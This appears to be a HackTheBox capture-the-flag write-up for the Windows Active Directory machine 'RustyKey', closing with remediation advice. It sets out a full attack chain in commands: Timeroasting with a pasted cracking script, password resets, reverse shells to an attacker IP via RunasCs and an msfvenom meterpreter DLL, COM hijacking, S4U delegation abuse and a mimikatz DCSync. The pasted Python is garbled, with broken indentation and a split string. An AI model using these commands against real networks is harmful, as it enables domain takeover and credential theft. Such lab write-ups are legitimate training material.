# HackTheBox - RustyKey Writeup

**Machine:** RustyKey  
**IP Address:** 10.10.11.75  
**Difficulty:** Hard
**OS:** Windows (Active Directory)

---

## Table of Contents

- [Reconnaissance](#reconnaissance)
- [Initial Access](#initial-access)
- [Privilege Escalation - User](#privilege-escalation---user)
- [Privilege Escalation - Root](#privilege-escalation---root)
- [Key Takeaways](#key-takeaways)
- [Tools Used](#tools-used)
- [Flags](#flags)
- [Remediation Recommendations](#remediation-recommendations)

---

## Reconnaissance

### Target Details

- Hosts: `dc.rustykey.htb`, `rustykey.htb`

### Kerberos Configuration

```ini
[libdefaults]
  default_realm = RUSTYKEY.HTB
  dns_lookup_realm = false
  dns_lookup_kdc = false
  ticket_lifetime = 24h
  forwardable = yes
  default_tkt_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
  default_tgs_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
  permitted_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96

[realms]
  RUSTYKEY.HTB = {
    kdc = 10.10.11.75
  }

[domain_realm]
  .rustykey.htb = RUSTYKEY.HTB
  rustykey.htb = RUSTYKEY.HTB
```

### LDAP User Enumeration

Simple bind was allowed with username/password:

```bash
ldapsearch -x -H ldap://10.10.11.75 -D 'rr.parker@rustykey.htb' -w '8#t5HE8L!W3A' -b 'dc=rustykey,dc=htb' "(objectClass=user)" userPrincipalName
```

### BloodHound Enumeration

```bash
getTGT.py -dc-ip 10.10.11.75 rustykey.htb/rr.parker:'8#t5HE8L!W3A'
export KRB5CCNAME=rr.parker.ccache
klist
bloodhound-python -u 'rr.parker' -p '8#t5HEL!W3A' -c All -d rustykey.htb -ns 10.10.11.75 --zip -k
```

**Findings:**

- IT_COMPUTER3$ can add itself to HELPDESK.
- HELPDESK can reset passwords for: `bb.morgan`, `gg.anderson`, `dd.ali`, `ee.reed`.
- `MM.TURNER` has AddAllowedToAct rights on `DC.RUSTKEY.HTB`.
- These users can connect via Evil-WinRM: `bb.morgan`, `gg.anderson`, `ee.reed`.

---

## Initial Access

### Timeroast IT_COMPUTER3$

Downloaded Timeroast tools:

```
https://github.com/SecuraBV/Timeroast
```

Ran Timeroast:

```bash
python3 timeroast.py 10.10.11.75 -o rustykey.hashes
python3 timecrack.py rustykey.hashes2 /usr/share/wordlists/rockyou.txt
```

Recovered password:

- `IT_COMPUTER3$ / Rusty88!`

RID 1125 corresponds to IT_COMPUTER3$.

Modified `timecrack.py` used (UTF-8 fix):

```python
#!/usr/bin/env python3

"""Perform a simple dictionary attack against the output of timeroast.py. Necessary because the NTP 'hash' format
unfortunately does not fit into Hashcat or John right now.

Not even remotely optimized, but still useful for cracking legacy default passwords (where the password is the computer
name) or specific default passwords that are popular in an organisation.
"""

from binascii import hexlify, unhexlify
from argparse import ArgumentParser, FileType, RawDescriptionHelpFormatter
from typing import TextIO, Generator, Tuple
import hashlib, sys, re

HASH_FORMAT = r'^(?P<rid>\d+):\$sntp-ms\$(?P<hashval>[0-9a-f]{32})\$(?P<salt>[0-9a-f]{96})$'

def md4(data: bytes) -> bytes:
    try:
        return hashlib.new('md4', data).digest()
    except ValueError:
        from md4 import MD4 # Fallback to pure Python if OpenSSL has no MD4
        return MD4(data).bytes()

def compute_hash(password: str, salt: bytes) -> bytes:
    """Compute a legacy NTP authenticator 'hash'."""
    return hashlib.md5(md4(password.encode('utf-16le')) + salt).digest()

def try_crack(hashfile: TextIO, dictfile: TextIO) -> Generator[Tuple[int, str], None, None]:
    hashes = []
    for line in hashfile:
        line = line.strip()
        if line:
            m = re.match(HASH_FORMAT, line)
            if not m:
                 print(f'ERROR: invalid hash format: {line}', file=sys.stderr)
                 sys.exit(1)
            rid, hashval, salt = m.group('rid', 'hashval', 'salt')
             hashes.append((int(rid), unhexlify(hashval), unhexlify(salt)))

     for password in dictfile:
         password = password.strip()
         for rid, hashval, salt in hashes:
             if compute_hash(password, salt) == hashval:
                 yield rid, password

 def main():
     argparser = ArgumentParser(formatter_class=RawDescriptionHelpFormatter, description=\
 """Perform a simple dictionary attack against the output of timeroast.py.

 Not even remotely optimized, but still useful for cracking legacy default
 passwords (where the password is the computer name) or specific default
 passwords that are popular in an organisation.
 """)

     argparser.add_argument('hashes', type=FileType('r'), help='Output of timeroast.py')
     argparser.add_argument('dictionary', type=lambda f: open(f, encoding='latin-1'), help='Line-delimited password dictionary (e.g.
 rockyou.txt)')
     args = argparser.parse_args()

     crackcount = 0
     for rid, password in try_crack(args.hashes, args.dictionary):
         print(f'[+] Cracked RID {rid} password: {password}')
         crackcount += 1

     print(f'\n{crackcount} passwords recovered.')

 if __name__ == '__main__':
     main()
```

---

## Privilege Escalation - User

### Exploit Chain to bb.morgan

```bash
getTGT.py -dc-ip 10.10.11.75 'rustykey.htb/IT-COMPUTER3$:Rusty88!'
export KRB5CCNAME=IT-COMPUTER3$.ccache
bloodyAD --host dc.rustykey.htb --dc-ip 10.10.11.75 -d rustykey.htb -k add groupMember 'HELPDESK' IT-COMPUTER3$

bloodyAD --host dc.rustykey.htb -k -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'Protected Objects' 'IT'

bloodyAD --kerberos --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' set password bb.morgan 'pa$$w0rd'

getTGT.py -dc-ip 10.10.11.75 'rustykey.htb/bb.morgan:pa$$w0rd'
export KRB5CCNAME=bb.morgan.ccache
evil-winrm -i dc.rustykey.htb -u bb.morgan -r rustykey.htb
```

User flag:

```cmd
type C:\Users\bb.morgan\Desktop\user.txt
```

### ee.reed via RunasCs

Reset `ee.reed` password and use RunasCs (Evil-WinRM failed for ee.reed):

```bash
export KRB5CCNAME=IT-COMPUTER3$.ccache
bloodyAD --host dc.rustykey.htb --dc-ip 10.10.11.75 -d rustykey.htb -k add groupMember 'HELPDESK' IT-COMPUTER3$

bloodyAD --kerberos --dc-ip 10.10.11.75 --host dc.rustykey.htb -d rustykey.htb -u IT-COMPUTER3$ -p 'Rusty88!' remove groupMember "CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB" "SUPPORT"

bloodyAD --kerberos --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' set password ee.reed 'Password123!'
```

RunasCs from bb.morgan shell:

```cmd
mkdir C:\Tools
cd C:\Tools
upload RunasCs.exe
nc -lvnp 4444
.\RunasCs.exe ee.reed Password123! cmd.exe -r 10.10.16.x:4444
```

---

## Privilege Escalation - Root

### COM Hijacking to bb.turner

Generated DLL and uploaded:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.x LPORT=4444 -f dll -o rev.dll
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.16.x; set LPORT 4444; exploit"
```

Registry hijack:

```cmd
reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /d "C:\Tools\rev.dll" /f
```

### Delegation and S4U2Self

Set delegation for machine account:

```powershell
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$
```

Impersonate domain admin and execute:

```bash
impacket-getST -spn 'cifs/DC.rustykey.htb' -impersonate backupadmin -dc-ip 10.10.11.75 -k 'RUSTYKEY.HTB/IT-COMPUTER3$:Rusty88!'
export KRB5CCNAME=backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache
wmiexec.py -k -no-pass 'RUSTYKEY.HTB/backupadmin@dc.rustykey.htb'
```

Root flag:

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

### Alternative: DCSync via Mimikatz

```bash
export KRB5CCNAME=backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache
psexec.py -k -no-pass 'RUSTYKEY.HTB/backupadmin@dc.rustykey.htb'
./mimikatz.exe
lsadump::dcsync /domain:RUSTYKEY.HTB /user:Administrator
impacket-getTGT 'rustykey.htb/Administrator' -hashes :f7a351e12f70cc177a1d5bd11b28ac26 -dc-ip 10.10.11.75
export KRB5CCNAME=Administrator.ccache
evil-winrm -i dc.rustykey.htb -r RUSTYKEY.HTB
```

---

## Key Takeaways

1. LDAP simple bind enabled full user enumeration.
2. Timeroast exposed machine account passwords.
3. Helpdesk rights allowed password resets and escalation.
4. COM hijacking and delegation chaining led to domain admin impersonation.
5. S4U2Self and DCSync provided multiple DA paths.

---

## Tools Used

- ldapsearch
- bloodhound-python
- timeroast.py / timecrack.py
- nxc
- bloodyAD
- evil-winrm
- RunasCs
- msfvenom / Metasploit
- impacket-getST / wmiexec.py / psexec.py
- mimikatz

---

## Flags

**User Flag:** `C:\Users\bb.morgan\Desktop\user.txt` (value not recorded in PDF)  
**Root Flag:** `C:\Users\Administrator\Desktop\root.txt` (value not recorded in PDF)

---

## Remediation Recommendations

### Critical Severity

1. **Disable LDAP Simple Bind Where Possible**

   - **Issue:** Simple bind allowed full user enumeration.
   - **Impact:** User discovery for targeted attacks.
   - **Remediation:**
     - Require LDAPS and SASL binds.
     - Restrict anonymous and low-privileged binds.

2. **Fix Delegation and Group Abuse**

   - **Issue:** IT_COMPUTER3$ could modify group membership and passwords.
   - **Impact:** Account takeover and privilege escalation.
   - **Remediation:**
     - Audit privileged group memberships.
     - Restrict helpdesk rights to least privilege.

### High Severity

3. **Protect Machine Account Secrets**

   - **Issue:** Timeroast exposed IT_COMPUTER3$ password.
   - **Impact:** Control of machine account and delegated rights.
   - **Remediation:**
     - Enforce strong machine account passwords and rotation.

4. **Harden AD Delegation**

   - **Issue:** S4U2Self allowed impersonation to backupadmin.
   - **Impact:** Domain escalation to SYSTEM/DA.
   - **Remediation:**
     - Restrict delegation rights and monitor for S4U abuse.

### Medium Severity

5. **Limit Local Execution of Admin Tools**

   - **Issue:** RunasCs, COM hijack, and writable registry paths enabled escalation.
   - **Impact:** Token misuse and privilege escalation.
   - **Remediation:**
     - Lock down registry paths and reduce local admin tooling.
